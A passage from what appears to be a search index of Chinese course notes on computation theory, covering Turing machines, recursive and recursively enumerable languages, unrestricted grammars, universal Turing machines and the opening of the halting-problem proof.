\u79bb\u5f00\u540e\uff0c\u5c31\u4e0d\u4f1a\u518d\u56de\u5230\u8be5\u4f4d\u7f6e\uff0c\u5373\u9700\u8981\u6ee1\u8db3<ul> <li>\\(\\forall q\\in K-H\\; \\text{if} \\; \\delta(q,\\rhd)=(p,b),\\; \\text{then} \\; b=\\rightarrow\\)</li> <li>\\(\\forall q\\in K-H\\; \\text{and}\\; a\\in \\Sigma  \\; \\text{if} \\; \\delta(q,a)=(p,b),\\; \\text{then} \\; b \\ne \\rhd\\)</li> </ul> </li> </ul> </li> </ul> <p>\u56fe\u7075\u673a\u662f Deterministic \u7684\uff0c\u4e0d\u5141\u8bb8\u5728\u540c\u4e00\u4e2a\u72b6\u6001\u8bfb\u5165\u540c\u4e00\u4e2a\u7b26\u53f7\u800c\u4ea7\u751f\u4e0d\u540c\u7684\u8f93\u51fa\u3002\u5b8c\u6574\u7684\u56fe\u7075\u673a\u5b9a\u4e49\u8fd8\u5305\u62ec\u63a5\u53d7\u72b6\u6001\u548c\u62d2\u7edd\u72b6\u6001\u4e24\u4e2a\u90e8\u5206\uff0c\u4e00\u4e2a\u56fe\u7075\u673a\u63a5\u53d7 String Input \u5f53\u4e14\u4ec5\u5f53 TM \u6700\u540e\u505c\u673a\uff0c\u5e76\u4e14\u5904\u4e8e\u63a5\u53d7\u72b6\u6001\uff1a</p> \u6700\u7ec8\u72b6\u6001 \u662f\u5426\u505c\u673a \u7ed3\u679c \u63a5\u53d7\u72b6\u6001 \u505c\u673a \u2714 \u63a5\u53d7 \u62d2\u7edd\u72b6\u6001 \u505c\u673a \u2718 \u4e0d\u63a5\u53d7 \u975e\u63a5\u53d7/\u62d2\u7edd\u72b6\u6001 \u4e0d\u505c\u673a \u2718 \u4e0d\u63a5\u53d7\uff08loop\uff09 <p>\u56fe\u7075\u673a\u4e0a\u5b9a\u4e49\u7684 Configuration \u4e3a\u4e09\u5143\u7ec4\uff1a\\((q,u,v) \\in K\\times \\rhd (\\Sigma - \\{\\rhd\\})^* \\times (\\{e\\}\\cup (\\Sigma -\\{\\rhd\\})^* (\\Sigma -\\{\\rhd , \\sqcup\\}))\\)</p> <ul> <li>\\(u\\) \u79f0\u4e3a\u5de6\u4fa7\u5b57\u7b26\u4e32<ul> <li>\\(\\rhd (\\Sigma - \\{\\rhd\\})^*\\)\uff1a\u7eb8\u5e26\u4ece Left End \u5230\u8bfb\u5199\u5934\u4e3a\u6b62\u7684\u4f4d\u7f6e</li> </ul> </li> <li>\\(v\\) \u79f0\u4e3a\u53f3\u4fa7\u5b57\u7b26\u4e32<ul> <li>\\(\\{e\\}\\)\uff1a\u8bfb\u5199\u5934\u53f3\u4fa7\u5168\u4e3a Blank \u5219\u4e3a \\(e\\)</li> <li>\\((\\Sigma -\\{\\rhd\\})^* (\\Sigma -\\{\\rhd , \\sqcup\\})\\)\uff1a\u8bfb\u5199\u5934\u53f3\u4fa7\u7684\u975e\u7a7a\u683c\u5b50</li> </ul> </li> </ul> <p>\u82e5\u72b6\u6001 \\(q \\in K\\) \u5c5e\u4e8e\u505c\u673a\u72b6\u6001\uff0c\u5373 \\(q\\in H\\)\uff0c\u5219\u79f0\u8be5\u914d\u7f6e\u4e3a\u505c\u673a\u914d\u7f6e\u3002\u56fe\u7075\u673a\u4ece\u521d\u59cb\u914d\u7f6e \\((s, \\rhd, w)\\) \u5f00\u59cb\u8fd0\u884c\uff0c\u6309\u7167 \\(\\delta\\) \u89c4\u5219\u4e0d\u65ad\u8f6c\u79fb\u914d\u7f6e\uff0c\u5176\u4e2d \\(w\\) \u5373\u4e3a\u8f93\u5165\u5b57\u7b26\u4e32\u3002</p> <p>\\((q,\\rhd \\sqcup ab, a)\\) \u53ef\u4ee5\u7b49\u4ef7\u5199\u4e3a \\((q, \\rhd \\sqcup a\\underline ba)\\)\uff0c\u4e0b\u5212\u7ebf\u8868\u793a\u8bfb\u5199\u5934\u6b63\u6307\u5411\u7684\u4f4d\u7f6e</p> <p>\u4e3a\u4e86\u7b80\u5316\u8bbe\u8ba1\uff0c\u4eba\u4eec\u5f15\u5165\u4e86\u5404\u79cd\u56fe\u7075\u673a\u7684\u6269\u5c55\u6a21\u578b\uff0c\u5982\u591a\u5e26\u3001\u591a\u5934\u3001\u4e8c\u7ef4\u78c1\u5e26\u3001\u975e\u786e\u5b9a\u6027\u7b49\uff0c\u4f46\u8fd9\u4e9b\u6269\u5c55\u5e76\u4e0d\u4f1a\u672c\u8d28\u589e\u52a0\u56fe\u7075\u673a\u7684\u8ba1\u7b97\u80fd\u529b\uff0c\u5373\u4efb\u4f55\u62d3\u5c55\u56fe\u7075\u673a\u90fd\u53ef\u4ee5\u7531\u666e\u901a\u5355\u5e26\u786e\u5b9a\u6027\u56fe\u7075\u673a\u6a21\u62df\u3002</p> <p>\u591a\u5e26\u56fe\u7075\u673a\u62e5\u6709 \\(k\\) \u4e2a\u78c1\u5e26\u548c \\(k\\) \u4e2a\u8bfb\u5199\u5934\u3002\u5f62\u5f0f\u4e0a\uff0c\u5b83\u7684\u8f6c\u79fb\u51fd\u6570 \\(\\delta\\) \u4f5c\u7528\u5728\u6240\u6709 \\(k\\) \u4e2a\u8bfb\u5199\u5934\u5f53\u524d\u8bfb\u53d6\u7684\u7b26\u53f7\u4e0a\uff0c\u5e76\u540c\u65f6\u66f4\u65b0\u6240\u6709\u5934\u7684\u4f4d\u7f6e\u548c\u5199\u5165\u7b26\u53f7\u3002\u521d\u59cb\u65f6\uff0c\u8f93\u5165\u5b57\u7b26\u4e32\u653e\u5728\u7b2c\u4e00\u6761\u5e26\uff0c\u5176\u4ed6\u5404\u5e26\u5747\u4e3a\u7a7a\u3002\u7ed3\u675f\u65f6\u7b2c\u4e00\u6761\u5e26\u4e0a\u7684\u5185\u5bb9\u4e3a\u8f93\u51fa\uff0c\u5176\u4ed6\u5e26\u5ffd\u7565\u3002</p> <p>\u591a\u5e26\u56fe\u7075\u673a\u5728\u5b9e\u9645\u6784\u9020\u4e2d\u975e\u5e38\u65b9\u4fbf\uff0c\u4f8b\u5982\u53ef\u4ee5\u7528\u4e24\u5e26\u56fe\u7075\u673a\u8f7b\u6613\u5b9e\u73b0\u5b57\u7b26\u4e32\u590d\u5236\uff1a\u7b2c\u4e00\u6761\u5e26\u8bfb\u53d6\u539f\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u6761\u5e26\u540c\u6b65\u5199\u5165\u6bcf\u4e2a\u5b57\u7b26\uff0c\u7136\u540e\u518d\u5c06\u7b2c\u4e8c\u6761\u5e26\u4e0a\u7684\u5185\u5bb9\u62f7\u8d1d\u56de\u7b2c\u4e00\u6761\u5e26\uff1b\u4e5f\u53ef\u5e76\u884c\u5730\u5b9e\u73b0\u4efb\u610f\u591a\u6bd4\u7279\u7684\u4e8c\u8fdb\u5236\u52a0\u6cd5\uff08\u5728\u4e24\u5e26\u4e0a\u5206\u522b\u5b58\u653e\u4e24\u4e2a\u6570\uff0c\u7136\u540e\u6309\u4f4d\u76f8\u52a0\uff09\u3002</p>"},{"location":"Courses/tcs/Topic3/#recursive-language","title":"Recursive Language","text":"<p>Quote</p> <p></p> <p>\u6211\u4eec\u89c4\u5b9a\u56fe\u7075\u673a\u6709\u4e24\u4e2a\u7279\u6b8a\u7684\u505c\u673a\u72b6\u6001\uff1a\u63a5\u53d7\u6001\u548c\u62d2\u7edd\u6001\u3002\u5982\u679c\u5728\u8f93\u5165\u5b57\u7b26\u4e32 \\(w\\) \u4e0b\u673a\u5668\u8fd0\u884c\u6700\u7ec8\u8fdb\u5165\u63a5\u53d7\u6001\u5e76\u505c\u673a\uff0c\u5c31\u79f0\u8be5\u673a\u63a5\u53d7 \\(w\\)\uff1b\u5982\u679c\u8fdb\u5165\u62d2\u7edd\u6001\u5e76\u505c\u673a\uff0c\u5219\u79f0\u62d2\u7edd \\(w\\)\u3002</p> <p>\u82e5\u673a\u5668\u5bf9\u4e8e\u4efb\u610f\u8f93\u5165\u90fd\u5fc5\u505c\u673a\uff08\u8fdb\u5165\u63a5\u53d7\u6216\u62d2\u7edd\u6001\uff09\uff0c\u5219\u79f0\u5b83\u51b3\u5b9a\uff08decide\uff09\u4e00\u4e2a\u8bed\u8a00 \\(L\\subseteq\\Sigma^*\\)\uff1a\u5f53\u4e14\u4ec5\u5f53 \\(w\\in L\\) \u65f6\u673a\u5668\u63a5\u53d7 \\(w\\)\uff0c\u5426\u5219\u62d2\u7edd\u3002\u8bed\u8a00 \\(L\\) \u5982\u679c\u5b58\u5728\u5982\u6b64\u7684\u56fe\u7075\u673a\uff0c\u5c31\u79f0 \\(L\\)\u00a0\u4e3a Recursive Language\u3002</p> <p>\u5982\u679c\u4e00\u53f0\u56fe\u7075\u673a\u5bf9\u8f93\u5165 \\(w\\in L\\) \u65f6\u5fc5\u505c\u673a\u63a5\u53d7\uff0c\u4f46\u5bf9 \\(w\\notin L\\) \u65f6\u5219\u53ef\u80fd\u6c38\u4e0d\u505c\u673a\uff08\u65e2\u4e0d\u63a5\u53d7\u4e5f\u4e0d\u660e\u786e\u62d2\u7edd\uff09\uff0c\u90a3\u4e48\u79f0\u8be5\u673a\u534a\u5224\u5b9a\uff08semidecide\uff09\u8bed\u8a00 \\(L\\)\u3002\u80fd\u88ab\u56fe\u7075\u673a\u534a\u5224\u5b9a\u7684\u8bed\u8a00\u79f0\u4e3a\u53ef\u8bc6\u522b\u8bed\u8a00\u6216\u9012\u5f52\u53ef\u679a\u4e3e\u8bed\u8a00\uff08Recursive Enumerable, RE\uff09\u3002</p> \u8fd0\u7b97 \u9012\u5f52\u8bed\u8a00 \u9012\u5f52\u53ef\u679a\u4e3e\u8bed\u8a00 \u5e76 (\\(\\cup\\)) \u2705 \u2705 \u4ea4 (\\(\\cap\\)) \u2705 \u2705 \u8fde\u63a5 (\\(\\circ\\)) \u2705 \u2705 \u8865 (\\(\\bar{A}\\)) \u2705 \u274c Kleene \u661f (\\(*\\)) \u2705 \u2705 <p>If \\(L\\) is a recursive language, then it is R.E</p> <p>Tip</p> <p>\u76f4\u89c2\u5730\u8bf4\uff0c\u56fe\u7075\u673a\u53ef\u4ee5\u201c\u679a\u4e3e\u201d\u51fa\u8bed\u8a00\u4e2d\u7684\u6240\u6709\u5b57\u7b26\u4e32\uff0c\u4f46\u5bf9\u4e8e\u4e0d\u5728\u8bed\u8a00\u4e2d\u7684\u8f93\u5165\uff0c\u5b83\u53ef\u80fd\u9677\u5165\u65e0\u9650\u5faa\u73af\u3002\u56fe\u7075\u53ef\u8bc6\u522b\u8bed\u8a00\u4e5f\u79f0\u4e3a\u7c7b\u578b-0\u8bed\u8a00\uff0c\u4e0e\u4efb\u610f\u6587\u6cd5\u751f\u6210\u7684\u8bed\u8a00\u7b49\u4ef7\u3002</p>"},{"location":"Courses/tcs/Topic3/#nondeterministic-turing-machine","title":"Nondeterministic Turing Machine","text":"<p>\u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a\uff08Nondeterministic Turing Machine, NTM\uff09\u662f\u4e00\u79cd\u5141\u8bb8\u5728\u6bcf\u4e00\u6b65\u6709\u591a\u79cd\u53ef\u80fd\u8f6c\u79fb\u7684\u6a21\u578b\u3002</p> <p>\u5f62\u5f0f\u4e0a\uff0c\u4e00\u4e2a NTM \u7684\u8f6c\u79fb\u5173\u7cfb \\(\\Delta\\) \u662f\u4e00\u4e2a\u4ece \\((K-H)\\times\\Sigma\\) \u5230\u82e5\u5e72\u53ef\u80fd\u52a8\u4f5c\u7684\u591a\u503c\u6620\u5c04\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5728\u7ed9\u5b9a\u72b6\u6001\u548c\u7b26\u53f7\u4e0b\uff0c\u5b83\u53ef\u80fd\u6709\u591a\u6761\u89c4\u5219\u53ef\u4ee5\u540c\u65f6\u9002\u7528\u3002\u8fd9\u65f6\uff0c\u673a\u5668\u7684\u8fd0\u884c\u53ef\u4ee5\u88ab\u770b\u4f5c\u662f\u4e00\u68f5\u8ba1\u7b97\u6811\uff1a\u673a\u5668\u4ece\u8d77\u59cb\u914d\u7f6e\u5f00\u59cb\uff0c\u6bcf\u5f53\u9047\u5230\u591a\u4e2a\u53ef\u9009\u64cd\u4f5c\u5c31\u6cbf\u4e0d\u540c\u5206\u652f\u7ee7\u7eed\u8ba1\u7b97\u3002</p> <p>\u53ea\u8981\u6709\u4e00\u6761\u201c\u731c\u6d4b\u8def\u5f84\u201d\u4f7f\u673a\u5668\u63a5\u53d7\uff0c\u5373\u8bfb\u53d6\u8f93\u5165 \\(w\\) \u5e76\u6700\u7ec8\u8fdb\u5165\u63a5\u53d7\u6001\u505c\u673a\uff0c\u5c31\u79f0\u8be5 NTM \u63a5\u53d7 \\(w\\)\u3002</p> <ul> <li>\u5982\u679c NTM \u5728\u6240\u6709\u8f93\u5165\u4e0a\u6240\u6709\u5206\u652f\u90fd\u4fdd\u8bc1\u505c\u673a\uff0c\u5219\u5b83\u53ef\u4ee5\u51b3\u5b9a\u4e00\u4e2a\u8bed\u8a00\uff1a\u5f53\u4e14\u4ec5\u5f53 \\(w\\) \u5c5e\u4e8e\u8be5\u8bed\u8a00\u65f6\u81f3\u5c11\u6709\u4e00\u4e2a\u5206\u652f\u63a5\u53d7\uff0c\u5426\u5219\u6ca1\u6709\u5206\u652f\u63a5\u53d7\u3002<ul> <li>\u6bd4\u8d77\u786e\u5b9a\u6027\u56fe\u7075\u673a\uff0c\u8fd9\u91cc\u591a\u4e86\u4e00\u79cd\u201c\u5b58\u5728\u63a5\u53d7\u8def\u5f84\u201d\u7684\u8981\u6c42\u3002</li> </ul> </li> <li>\u82e5\u53ea\u8981\u6c42\u5b58\u5728\u63a5\u53d7\u5206\u652f\u800c\u5176\u4ed6\u5206\u652f\u53ef\u80fd\u4e0d\u7ec8\u6b62\uff0c\u5219\u79f0\u8bed\u8a00\u88ab NTM \u534a\u5224\u5b9a\u3002</li> </ul> <p>\u4efb\u4f55 NTM \u80fd\u8bc6\u522b\u6216\u534a\u5224\u5b9a\u7684\u8bed\u8a00\uff0c\u90fd\u53ef\u4ee5\u88ab\u67d0\u53f0\u786e\u5b9a\u6027\u56fe\u7075\u673a\u8bc6\u522b\u6216\u534a\u5224\u5b9a\uff0c\u4e5f\u5c31\u662f\u8bf4 NTM \u548c\u56fe\u7075\u673a\u8ba1\u7b97\u80fd\u529b\u76f8\u540c</p> <p>\u3010Example\u3011 \u6784\u9020 NTM \u6765\u534a\u5224\u5b9a\u8bed\u8a00 \\(C=\\{\\text{\u4e8c\u8fdb\u5236\u8868\u793a\u7684\u5408\u6570\uff08\u975e\u8d28\u6570\uff09}\\}\\)\u3002</p> <p>\u6211\u4eec\u5229\u7528 NTM \u7684\u975e\u786e\u5b9a\u6027\u76f4\u63a5\u731c\u6d4b\u56e0\u5b50 \\(p *q\\)\uff0c\u7531\u4e8e \\(p\\) \u548c \\(q\\) \u5747\u5c0f\u4e8e\u8f93\u5165 \\(w\\)\uff0c\u6240\u4ee5\u731c\u6d4b\u662f\u6709\u9650\u6b65\u7684\u3002\u6211\u4eec\u5c06\u6240\u6709\u5206\u652f\u7684 \\(p\\) \u548c \\(q\\) \u76f8\u4e58\uff0c\u5982\u679c\u7ed3\u679c\u7b49\u4e8e \\(w\\)\uff0c\u5219\u8be5\u5206\u652f\u80fd\u731c\u5bf9\u5e76\u63a5\u53d7\uff1b\u5426\u5219\uff0c\u6ca1\u6709\u4efb\u4f55\u5206\u652f\u4f1a\u63a5\u53d7\uff08\u4f46\u53ef\u4ee5\u65e0\u9650\u5faa\u73af\uff0c\u5373\u4e0d\u505c\u673a\uff09\u3002</p> <p>\u6b64\u65f6\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u662f\u4f7f\u7528\u4e00\u4e2a 3-\u5e26\u56fe\u7075\u673a\u8fdb\u884c\u6a21\u62df\uff0c\u7b2c\u4e00\u6761\u78c1\u5e26\u8bfb\u53d6\u4e8c\u8fdb\u5236\u8f93\u5165 \\(w\\)\uff0c\u7b2c\u4e8c\u6761\u78c1\u5e26\u548c\u7b2c\u4e09\u6761\u78c1\u5e26\u5206\u522b\u7528\u4e8e\u5199\u88ab\u731c\u6d4b\u7684 \\(p,q\\)\u3002.</p>"},{"location":"Courses/tcs/Topic3/#grammer","title":"Grammer","text":"<p>Grammer \u662f\u6700\u4e00\u822c\u7684\u6587\u6cd5\uff0c\u4e0e Context-free Grammer \u76f8\u6bd4\uff0cGrammer \u5141\u8bb8 rules \u5de6\u4fa7\u5305\u542b\u4efb\u610f\u6570\u91cf\u7684\u7b26\u53f7\uff0c\u4f46\u81f3\u5c11\u542b\u6709\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\u3002</p> <p>\u56de\u5fc6\u4e00\u4e0b\uff1aCFG \u8981\u6c42 rules \u5de6\u4fa7\u53ea\u80fd\u662f\u5355\u4e2a\u975e\u7ec8\u7ed3\u7b26, Nonterminal</p> <p>\u6587\u6cd5 \\(G\\) \u7684\u63a8\u5bfc\u8bb0\u53f7\u7528 \\(\\Rightarrow_G\\) \u8868\u793a\uff1a\u82e5\u6709 \\(uAw\\to uBw\\) \u662f \\(G\\) \u7684\u4e00\u6761\u89c4\u5219\uff0c\u5219\u6709 \\(uAw\\Rightarrow_G uBw\\)\u3002\u6587\u6cd5\u751f\u6210\u7684\u8bed\u8a00 \\(L(G)=\\{w\\in\\Sigma^*: S\\Rightarrow_G^* w\\}\\) \u662f\u6240\u6709\u53ef\u4ece\u5f00\u59cb\u7b26\u53f7\u63a8\u5bfc\u5f97\u51fa\u7ec8\u7ed3\u7b26\u4e32\u7684\u96c6\u5408\u3002</p> <p>\u3010Example\u3011 \u6784\u9020 \\(\\{a^n b^n c^n: n \\ge 1\\}\\) \u5bf9\u5e94\u7684 Grammer\uff1a</p> \\[\\begin{aligned} S &amp;\\to A B C S \\mid T_c,\\\\ BA &amp;\\to AB,\\quad CA\\to AC,\\quad CB\\to BC,\\\\ C T_c &amp;\\to T_c c,\\quad C T_c \\to T_b c,\\quad B T_b \\to T_b b,\\quad B T_b \\to T_a b,\\quad A T_a \\to T_a a,\\quad T_a \\to e \\end{aligned}\\] <p>\u76f4\u89c2\u4e0a\uff0c\u7b2c\u4e00\u6392\u7684\u89c4\u5219\u4f1a\u5148\u4ece\u5f00\u59cb\u7b26\u53f7\u751f\u6210 \\((ABC)^NT_c\\)\uff0c\u7136\u540e\u901a\u8fc7\u7b2c\u4e8c\u6392\u7684\u91cd\u6392\u89c4\u5219\u5c06\u6240\u6709\u7684 \\(A\\) \u79fb\u52a8\u5230\u6700\u5de6\u8fb9\uff0c\u6240\u6709\u7684 \\(C\\) \u79fb\u52a8\u5230\u6700\u53f3\u8fb9\uff08\\(T_c\\) \u5de6\u8fb9\uff09\uff0c\u4ece\u800c\u91cd\u6392\u4e3a \\(A^n B^n C^n T_c\\)\uff0c\u6700\u7ec8\u901a\u8fc7\u7b2c\u4e09\u6392\u7684\u66ff\u6362\u89c4\u5219\u8fdb\u884c\u8f6c\u6362\u3002</p> <p>Grammer \u548c\u56fe\u7075\u673a\u7684\u7b49\u4ef7\u5173\u7cfb\u8868\u73b0\u4e3a\uff0c\u4e00\u4e2a Language \u53ef\u4ee5\u88ab\u67d0\u4e2a Grammer \u751f\u6210\u5f53\u4e14\u4ec5\u5f53\u5b83\u662f\u4e00\u4e2a R.E Language\uff0c\u5373\u53ef\u4ee5\u88ab\u56fe\u7075\u673a\u534a\u5224\u5b9a\u3002</p>"},{"location":"Courses/tcs/Topic4/","title":"Undecidability","text":""},{"location":"Courses/tcs/Topic4/#undecidability","title":"Undecidability","text":"<p> \u7ea6 3437 \u4e2a\u5b57  5 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 17 \u5206\u949f</p>"},{"location":"Courses/tcs/Topic4/#church-turing-thesis","title":"Church-Turing Thesis","text":"<p>Algorithm \u88ab\u7406\u89e3\u4e3a\u603b\u80fd\u5728\u6240\u6709\u8f93\u5165\u4e0a\u90fd\u505c\u673a\u7684\u56fe\u7075\u673a\u3002\u6839\u636e Church-Turing Thesis \u5047\u8bbe\uff0c\u51e1\u662f\u80fd\u4ee5\u7b97\u6cd5\u5f62\u5f0f\u6267\u884c\u7684 Computation\uff0c\u90fd\u53ef\u4ee5\u88ab\u56fe\u7075\u673a\u6a21\u62df\u3002</p> <p>\u5373\u5f53\u4e14\u4ec5\u5f53\u53ef\u4ee5\u7528\u56fe\u7075\u673a\u5b9e\u73b0\u65f6\u79f0\u4e3a\u7b97\u6cd5\uff0c\u8be5\u8bba\u9898\u4e0d\u80fd\u4e25\u683c\u8bc1\u660e\uff0c\u4f46\u5b83\u662f\u8ba1\u7b97\u7406\u8bba\u7684\u57fa\u7840\u5047\u8bbe</p> <p>\u6211\u4eec\u77e5\u9053\uff0cTMs \u7684\u4e2a\u6570\u662f\u53ef\u6570\u7684\uff0c\u800c Problems \u6216 Language \u662f\u4e0d\u53ef\u6570\u7684\uff0c\u56e0\u6b64\u4e00\u5b9a\u5b58\u5728\u4e0d\u53ef\u88ab\u56fe\u7075\u673a\u8ba1\u7b97\u7684\u95ee\u9898\uff0c\u4e5f\u79f0\u4e00\u5b9a\u5b58\u5728 Nonrecursive Language\u3002</p> <p>Every Recursive Language is decided by a TM</p>"},{"location":"Courses/tcs/Topic4/#universal-turing-machines","title":"Universal Turing Machines","text":"<p>\u901a\u7528\u56fe\u7075\u673a UTM \u7684\u63d0\u51fa\u6807\u5fd7\u7740\u8ba1\u7b97\u7406\u8bba\u4ece\u201c\u5355\u4e00\u7528\u9014\u673a\u5668\u201d\u8f6c\u5411\u201c\u901a\u7528\u53ef\u7f16\u7a0b\u673a\u5668\u201d\u7684\u8303\u5f0f\uff0c\u5b83\u662f\u73b0\u4ee3\u5b58\u50a8\u7a0b\u5e8f\u8ba1\u7b97\u673a\u7684\u7406\u8bba\u539f\u578b\u3002</p> <p>\u5c06\u4efb\u610f\u56fe\u7075\u673a \\(M\\) \u7684\u72b6\u6001\u548c\u7b26\u53f7\u7528\u6709\u9650\u5b57\u7b26\u4e32\u8868\u793a\uff08\u4f8b\u5982\u7528\u4e8c\u8fdb\u5236\u7f16\u7801\u72b6\u6001\u548c\u7b26\u53f7\uff09\uff0c\u5e76\u5c06\u6574\u4e2a \\(M\\) \u7684\u4e94\u5143\u7ec4\u8868\u683c\u5e8f\u5217\u5316\u4e3a\u5b57\u7b26\u4e32 \\(\\langle M\\rangle\\)\u3002\u4e07\u80fd\u56fe\u7075\u673a \\(U\\) \u63a5\u6536\u8f93\u5165 \\(\\langle M\\rangle,w\\)\uff0c\u6a21\u62df\u4efb\u610f\u56fe\u7075\u673a \\(M\\) \u5728\u8f93\u5165 \\(w\\) \u4e0a\u7684\u884c\u4e3a\u3002</p> <p>\u5047\u8bbe \\(M = (K, \\Sigma, \\delta, s, H)\\)\uff1a</p> <ol> <li>\u72b6\u6001\u7f16\u7801\uff1a<ul> <li>\u8bbe \\(i = \\lceil \\log_2 |K| \\rceil\\)\u3002\u6bcf\u4e2a\u72b6\u6001\u7528\u5b57\u6bcd \\(q\\) \u540e\u8ddf \\(i\\) \u4f4d\u4e8c\u8fdb\u5236\u4e32\u8868\u793a\u3002</li> <li>\u7ea6\u5b9a\uff1a\u8d77\u59cb\u72b6\u6001 \\(s\\) \u7f16\u7801\u4e3a \\(q0^i\\)\u3002</li> </ul> </li> <li>\u7b26\u53f7\u7f16\u7801\uff1a<ul> <li>\u8bbe \\(j = \\lceil \\log_2 (|\\Sigma| + 2) \\rceil\\)\uff08\u5305\u542b\u5de6\u53f3\u79fb\u52a8\u65b9\u5411\uff09\u3002\u6bcf\u4e2a\u7b26\u53f7\u7528\u5b57\u6bcd \\(a\\) \u540e\u8ddf \\(j\\) \u4f4d\u4e8c\u8fdb\u5236\u4e32\u8868\u793a\u3002</li> <li>\u7279\u6b8a\u7b26\u53f7\u6620\u5c04\uff1a\u7a7a\u767d\u7b26 \\(\\sqcup\\) \u7f16\u7801\u4e3a \\(a0^j\\)\uff0c\u5de6\u7aef\u6807\u8bb0 \\(\\triangleright\\) \u4e3a \\(a0^{j-1}1\\)\uff0c\u5de6\u79fb \\(\\leftarrow\\) \u4e3a \\(a0^{j-2}10\\)\uff0c\u53f3\u79fb \\(\\rightarrow\\) \u4e3a \\(a0^{j-2}11\\)\u3002</li> </ul> </li> <li>\u8f6c\u79fb\u51fd\u6570\u7f16\u7801\uff1a<ul> <li>\u4e00\u6761\u8f6c\u79fb\u89c4\u5219 \\(\\delta(q, a) = (p, b, D)\\) \u88ab\u7f16\u7801\u4e3a\u4e00\u4e2a\u56db\u5143\u7ec4\u7684\u5e8f\u5217\uff1a\\(\\text{code}(q), \\text{code}(a), \\text{code}(p), \\text{code}(b/D)\\)\u3002</li> <li>\u6574\u53f0\u673a\u5668 \\(M\\) \u7684\u63cf\u8ff0 \\(\\langle M \\rangle\\) \u662f\u6240\u6709\u8f6c\u79fb\u89c4\u5219\u7f16\u7801\u7684\u62fc\u63a5\u3002</li> </ul> </li> </ol> <p>\u4f8b\u5982\u82e5 \\(s\\) \u7f16\u7801\u4e3a \\(q00\\)\uff0c\u7b26\u53f7 \\(a\\) \u7f16\u7801\u4e3a \\(a100\\)\uff0c\u5219\u89c4\u5219 \\(\\delta(s, a) = (q, \\rightarrow)\\) \u53ef\u80fd\u88ab\u7f16\u7801\u4e3a \\((q00, a100, q01, a011)\\) \u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u4e32\u3002</p> \u8bfe\u4ef6\u4e0a\u7684\u4f8b\u5b50 <p></p> <p>\u5177\u4f53\u8bbe\u8ba1\u4e2d\uff0c\\(U\\) \u53d6\u4e09\u6761\u78c1\u5e26\uff0c\u5c06\u63cf\u8ff0 \\(\\langle M\\rangle\\) \u590d\u5236\u5230\u7b2c\u4e8c\u6761\u78c1\u5e26\u3001\u5c06\u8f93\u5165 \\(w\\) \u5199\u5728\u7b2c\u4e00\u6761\u78c1\u5e26\uff0c\u7b2c\u4e09\u6761\u78c1\u5e26\u8bb0\u5f53\u524d\u4f4d\u7f6e\u72b6\u6001\uff1b\u7136\u540e\u5faa\u73af\u6a21\u62df \\(M\\) \u7684\u4e00\u6b65\uff1a\u5728\u7b2c\u4e8c\u6761\u78c1\u5e26\u68c0\u7d22\u5bf9\u5e94\u56db\u5143\u7ec4\u4ee5\u51b3\u5b9a\u65b0\u7684\u72b6\u6001\u548c\u7b26\u53f7\uff0c\u76f4\u5230 \\(M\\) \u8fdb\u5165\u505c\u673a\u72b6\u6001\u4e3a\u6b62\u3002\u8fd9\u6837\uff0c\\(U\\) \u5728 \\(\\langle M\\rangle w\\) \u4e0a\u7684\u8ba1\u7b97\u4e0e \\(M\\) \u5728 \\(w\\) \u4e0a\u7684\u8ba1\u7b97\u7b49\u4ef7\uff08\\(U(\\texttt{\"M\"\"w\"})= \\texttt{\"M(w)\"}\\)\uff09\u3002</p> <p>\u4e07\u80fd\u56fe\u7075\u673a\u8bc1\u660e\u4e86\u56fe\u7075\u673a\u201c\u53ef\u7f16\u7a0b\u201d\u7684\u80fd\u529b\uff0c\u5373\u53ef\u4ee5\u7528\u5355\u4e00\u673a\u5668\u6765\u6a21\u62df\u6240\u6709\u56fe\u7075\u673a\uff1b\u4e5f\u5f15\u51fa\u4e86\u91cd\u8981\u6982\u5ff5\uff1a\u53ef\u5224\u5b9a\u4e0e\u53ef\u679a\u4e3e\u3002</p>"},{"location":"Courses/tcs/Topic4/#halting-problem","title":"Halting Problem","text":"<p>\u505c\u673a\u95ee\u9898\u662f\u6700\u7ecf\u5178\u7684\u4e0d\u53ef\u5224\u5b9a\u95ee\u9898\u3002</p> <p>\u5047\u5b9a\u6211\u4eec\u6709\u4e00\u4e2a\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u5f53\u6709\u7a0b\u5e8f\u4e0d\u9012\u5f52\u8c03\u7528\u81ea\u5df1\u65f6\uff0c\u6d4b\u8bd5\u7a0b\u5e8f\u5c31\u8c03\u7528\u5b83\uff1b\u5f53\u6709\u7a0b\u5e8f\u9012\u5f52\u8c03\u7528\u81ea\u5df1\u65f6\uff0c\u6d4b\u8bd5\u7a0b\u5e8f\u5c31\u4e0d\u8c03\u7528\u5b83\u3002\u90a3\u4e48\u8bd5\u60f3\uff0c\u6d4b\u8bd5\u7a0b\u5e8f\u662f\u5426\u4f1a\u8c03\u7528\u81ea\u5df1\u5462\uff1f</p> <p>\u4e0a\u8ff0\u4f8b\u5b50\u8bf4\u660e\u5f53\u7b97\u6cd5\u8be2\u95ee\u81ea\u8eab\u884c\u4e3a\u65f6\u4f1a\u4ea7\u751f\u77db\u76fe\u3002\u6211\u4eec\u6709\u5b50\u7a0b\u5e8f <code>halt(P,X)</code> \u7528\u6765\u5224\u65ad\u4efb\u610f\u7a0b\u5e8f <code>P</code> \u5728\u8f93\u5165 <code>X</code> \u662f\u5426\u4f1a Halt\uff0c\u662f\u5219\u8fd4\u56de True\u3002\u90a3\u4e48\u5bf9\u4e8e\u5982\u4e0b\u51fd\u6570\uff0c\u6211\u4eec\u8c03\u7528 <code>diagonal(diagonal)</code> \u662f\u5426\u4f1a\u505c\u673a\u5462\uff1f</p> <pre><code>diagonal(X):\n    if halt(X, X):\n        diagonal(X)\n    else:\n        halt\n</code></pre> <p><code>diagonal(diagonal)</code> \u505c\u673a\u5f53\u4e14\u4ec5\u5f53 <code>halt(diagonal, diagonal)=False</code>\uff0c\u4ece\u800c\u53d1\u751f\u77db\u76fe\u3002</p> <p>\u5f62\u5f0f\u5316\u4e0a\uff0c\u5b9a\u4e49\u8bed\u8a00 \\(H=\\{\\langle M\\rangle w: 